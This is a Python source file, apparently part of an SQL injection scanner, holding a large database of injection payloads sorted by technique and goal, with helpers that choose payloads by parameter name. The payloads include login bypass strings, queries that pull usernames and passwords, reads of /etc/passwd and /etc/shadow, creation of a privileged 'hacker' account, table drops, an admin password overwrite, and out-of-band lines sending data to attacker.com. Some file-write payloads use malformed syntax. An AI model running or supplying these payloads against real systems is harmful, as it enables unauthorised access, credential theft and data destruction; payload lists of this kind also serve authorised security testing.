"""
SQL Injection Payloads Database
Comprehensive collection of SQL injection payloads for different techniques
"""

from typing import Dict, List
try:
    from .sqli import InjectionType, PayloadCategory
except ImportError:
    from sqli import InjectionType, PayloadCategory

class SQLInjectionPayloads:
    """Database of SQL injection payloads organized by technique and category"""
    
    def __init__(self):
        self.payloads = self._initialize_payloads()
    
    def _initialize_payloads(self) -> Dict[InjectionType, Dict[PayloadCategory, List[str]]]:
        """Initialize the payload database"""
        return {
            InjectionType.BOOLEAN_BASED: {
                PayloadCategory.AUTHENTICATION_BYPASS: [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' OR 1=1#",
                    "' OR 1=1/*",
                    "admin' OR '1'='1'--",
                    "admin' OR 1=1--",
                    "' OR 'x'='x",
                    "' OR 'a'='a",
                    "') OR ('1'='1",
                    "') OR (1=1--",
                    "' OR 1=1 OR '1'='1",
                    "' OR '1'='1' OR '1'='1",
                    "admin' OR '1'='1' OR '1'='1",
                    "' OR 1=1 OR 1=1--",
                    "' OR '1'='1' OR '1'='1'--",
                    "') OR ('1'='1' OR '1'='1",
                    "') OR (1=1 OR 1=1)--",
                    "' OR 1=1 OR '1'='1'--",
                    "' OR '1'='1' OR 1=1--",
                ],
                PayloadCategory.DATA_EXTRACTION: [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND (SELECT LENGTH(username) FROM users LIMIT 1)>0--",
                    "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
                    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>0--",
                    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.schemata)>0--",
                    "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
                    "' AND (SELECT COUNT(*) FROM pg_user)>0--",
                    "' AND (SELECT COUNT(*) FROM sysusers)>0--",
                ]
            },
            
            InjectionType.TIME_BASED: {
                PayloadCategory.DATA_EXTRACTION: [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "'; SLEEP(5)--",
                    "'; BENCHMARK(5000000,MD5(1))--",
                    "'; SELECT pg_sleep(5)--",
                    "'; SELECT SLEEP(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
                    "'; IF(1=1,SLEEP(5),0)--",
                    "'; CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
                    "'; WAITFOR DELAY '00:00:03'--",
                    "'; SLEEP(3)--",
                    "'; BENCHMARK(3000000,MD5(1))--",
                    "'; SELECT pg_sleep(3)--",
                    "'; SELECT SLEEP(3)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                    "'; IF(EXISTS(SELECT * FROM users),SLEEP(5),0)--",
                    "'; IF(EXISTS(SELECT * FROM information_schema.tables),SLEEP(5),0)--",
                    "'; IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
                    "'; IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0)--",
                ],
                PayloadCategory.DATABASE_ENUMERATION: [
                    "'; IF(EXISTS(SELECT * FROM users),SLEEP(5),0)--",
                    "'; IF(EXISTS(SELECT * FROM information_schema.tables),SLEEP(5),0)--",
                    "'; IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
                    "'; IF(EXISTS(SELECT * FROM mysql.user),SLEEP(5),0)--",
                    "'; IF(EXISTS(SELECT * FROM pg_user),SLEEP(5),0)--",
                    "'; IF(EXISTS(SELECT * FROM sysusers),SLEEP(5),0)--",
                    "'; IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0)--",
                    "'; IF((SELECT COUNT(*) FROM information_schema.columns)>0,SLEEP(5),0)--",
                    "'; IF((SELECT COUNT(*) FROM information_schema.schemata)>0,SLEEP(5),0)--",
                ]
            },
            
            InjectionType.ERROR_BASED: {
                PayloadCategory.DATABASE_ENUMERATION: [
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
                    "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e,0x78) s) AS t),8446744073709551610,8446744073709551610)))--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656c65637420404076657273696f6e;EXEC(@q)--",
                    "'; SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1)--",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e))--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns LIMIT 1),0x7e),1)--",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns LIMIT 1),0x7e))--",
                ],
                PayloadCategory.DATA_EXTRACTION: [
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>0)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>0)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>48)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>96)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,2,1))>0)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,3,1))>0)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>10)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>15)--",
                    "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>20)--",
                ]
            },
            
            InjectionType.UNION_BASED: {
                PayloadCategory.DATA_EXTRACTION: [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,2,3,4--",
                    "' UNION SELECT 1,2,3,4,5--",
                    "' UNION SELECT 'a','b','c'--",
                    "' UNION SELECT 'a','b','c','d'--",
                    "' UNION SELECT 'a','b','c','d','e'--",
                    "' UNION SELECT @@version,NULL,NULL--",
                    "' UNION SELECT database(),NULL,NULL--",
                    "' UNION SELECT user(),NULL,NULL--",
                    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--",
                    "' UNION SELECT username,password,NULL FROM users--",
                    "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--",
                    "' UNION SELECT @@version,database(),user()--",
                    "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
                    "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT username,password,email FROM users--",
                    "' UNION SELECT CONCAT(username,':',password,':',email),NULL,NULL FROM users--",
                ],
                PayloadCategory.DATABASE_ENUMERATION: [
                    "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
                    "' UNION SELECT table_name,column_name,data_type FROM information_schema.columns--",
                    "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns--",
                    "' UNION SELECT table_name,column_name,is_nullable FROM information_schema.columns--",
                    "' UNION SELECT table_name,column_name,column_default FROM information_schema.columns--",
                    "' UNION SELECT table_name,column_name,character_maximum_length FROM information_schema.columns--",
                    "' UNION SELECT table_schema,table_name,table_type FROM information_schema.tables--",
                    "' UNION SELECT table_name,column_name,ordinal_position FROM information_schema.columns--",
                ]
            },
            
            InjectionType.STACKED_QUERIES: {
                PayloadCategory.DATA_EXTRACTION: [
                    "'; SELECT @@version--",
                    "'; SELECT database()--",
                    "'; SELECT user()--",
                    "'; SELECT table_name FROM information_schema.tables--",
                    "'; SELECT column_name FROM information_schema.columns--",
                    "'; SELECT table_schema FROM information_schema.tables--",
                    "'; SELECT table_name,column_name FROM information_schema.columns--",
                    "'; SELECT username,password FROM users--",
                    "'; SELECT username,password,email FROM users--",
                    "'; SELECT CONCAT(username,':',password) FROM users--",
                    "'; SELECT CONCAT(username,':',password,':',email) FROM users--",
                    "'; SELECT COUNT(*) FROM users--",
                    "'; SELECT COUNT(*) FROM information_schema.tables--",
                    "'; SELECT COUNT(*) FROM information_schema.columns--",
                    "'; SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
                ],
                PayloadCategory.FILE_OPERATIONS: [
                    "'; SELECT LOAD_FILE('/etc/passwd')--",
                    "'; SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts')--",
                    "'; SELECT INTO OUTFILE '/tmp/test.txt' FROM users--",
                    "'; SELECT LOAD_FILE('/etc/hosts')--",
                    "'; SELECT LOAD_FILE('/proc/version')--",
                    "'; SELECT LOAD_FILE('/etc/issue')--",
                    "'; SELECT LOAD_FILE('/etc/motd')--",
                    "'; SELECT LOAD_FILE('/etc/shadow')--",
                    "'; SELECT LOAD_FILE('C:/Windows/win.ini')--",
                    "'; SELECT LOAD_FILE('C:/Windows/system.ini')--",
                    "'; SELECT INTO OUTFILE '/tmp/users.txt' FROM users--",
                    "'; SELECT INTO OUTFILE '/tmp/passwords.txt' FROM users--",
                    "'; SELECT INTO OUTFILE '/tmp/data.txt' FROM information_schema.tables--",
                ],
                PayloadCategory.PRIVILEGE_ESCALATION: [
                    "'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password'--",
                    "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--",
                    "'; DROP TABLE users--",
                    "'; CREATE USER 'test'@'localhost' IDENTIFIED BY 'test123'--",
                    "'; GRANT SELECT,INSERT,UPDATE,DELETE ON *.* TO 'test'@'localhost'--",
                    "'; GRANT FILE ON *.* TO 'test'@'localhost'--",
                    "'; GRANT PROCESS ON *.* TO 'test'@'localhost'--",
                    "'; GRANT SUPER ON *.* TO 'test'@'localhost'--",
                    "'; DROP TABLE IF EXISTS users--",
                    "'; DROP TABLE IF EXISTS passwords--",
                    "'; DROP TABLE IF EXISTS admin--",
                    "'; ALTER TABLE users ADD COLUMN hacked BOOLEAN DEFAULT TRUE--",
                    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                ]
            },
            
            InjectionType.OUT_OF_BAND: {
                PayloadCategory.DATA_EXTRACTION: [
                    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
                    "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
                    "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--",
                    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT database() FROM dual)) FROM dual--",
                    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT table_name FROM information_schema.tables WHERE ROWNUM=1)) FROM dual--",
                    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT column_name FROM information_schema.columns WHERE ROWNUM=1)) FROM dual--",
                    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM users WHERE ROWNUM=1)) FROM dual--",
                    "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--",
                    "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT database() FROM dual)||'.attacker.com')--",
                    "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM information_schema.tables WHERE ROWNUM=1)||'.attacker.com')--",
                ]
            }
        }
    
    def get_payloads_by_type(self, injection_type: InjectionType) -> List[str]:
        """Get all payloads for a specific injection type"""
        payloads = []
        if injection_type in self.payloads:
            for category in self.payloads[injection_type].values():
                payloads.extend(category)
        return payloads
    
    def get_payloads_by_category(self, category: PayloadCategory) -> List[str]:
        """Get all payloads for a specific category"""
        payloads = []
        for injection_type in self.payloads.values():
            if category in injection_type:
                payloads.extend(injection_type[category])
        return payloads
    
    def get_all_payloads(self) -> List[str]:
        """Get all payloads"""
        payloads = []
        for injection_type in self.payloads.values():
            for category in injection_type.values():
                payloads.extend(category)
        return payloads
    
    def get_payloads_for_parameter(self, param_name: str) -> List[str]:
        """Get relevant payloads based on parameter name"""
        param_lower = param_name.lower()
        
        # Authentication-related parameters
        if any(keyword in param_lower for keyword in ['user', 'pass', 'login', 'auth', 'id']):
            auth_payloads = self.get_payloads_by_category(PayloadCategory.AUTHENTICATION_BYPASS)
            data_payloads = self.get_payloads_by_category(PayloadCategory.DATA_EXTRACTION)[:10]
            return auth_payloads + data_payloads
        
        # Search-related parameters
        elif any(keyword in param_lower for keyword in ['search', 'query', 'q', 'keyword']):
            data_payloads = self.get_payloads_by_category(PayloadCategory.DATA_EXTRACTION)
            union_payloads = self.get_payloads_by_type(InjectionType.UNION_BASED)[:10]
            return data_payloads + union_payloads
        
        # ID-related parameters
        elif any(keyword in param_lower for keyword in ['id', 'uid', 'user_id']):
            auth_payloads = self.get_payloads_by_category(PayloadCategory.AUTHENTICATION_BYPASS)[:5]
            data_payloads = self.get_payloads_by_category(PayloadCategory.DATA_EXTRACTION)[:10]
            union_payloads = self.get_payloads_by_type(InjectionType.UNION_BASED)[:5]
            return auth_payloads + data_payloads + union_payloads
        
        # Generic parameters - use a mix of all types
        else:
            boolean_payloads = self.get_payloads_by_type(InjectionType.BOOLEAN_BASED)[:8]
            union_payloads = self.get_payloads_by_type(InjectionType.UNION_BASED)[:5]
            error_payloads = self.get_payloads_by_type(InjectionType.ERROR_BASED)[:5]
            return boolean_payloads + union_payloads + error_payloads
    
    def get_comprehensive_payloads_for_parameter(self, param_name: str) -> List[str]:
        """Get comprehensive payloads for thorough testing of a parameter"""
        param_lower = param_name.lower()
        
        # For high-risk parameters, test everything
        if any(keyword in param_lower for keyword in ['user', 'pass', 'login', 'auth', 'id']):
            all_payloads = []
            for injection_type in InjectionType:
                type_payloads = self.get_payloads_by_type(injection_type)
                all_payloads.extend(type_payloads[:10])  # Take first 10 from each type
            return all_payloads
        
        # For medium-risk parameters
        elif any(keyword in param_lower for keyword in ['search', 'query', 'q', 'keyword']):
            all_payloads = []
            for injection_type in InjectionType:
                type_payloads = self.get_payloads_by_type(injection_type)
                all_payloads.extend(type_payloads[:8])  # Take first 8 from each type
            return all_payloads
        
        # For low-risk parameters
        else:
            all_payloads = []
            for injection_type in InjectionType:
                type_payloads = self.get_payloads_by_type(injection_type)
                all_payloads.extend(type_payloads[:5])  # Take first 5 from each type
            return all_payloads 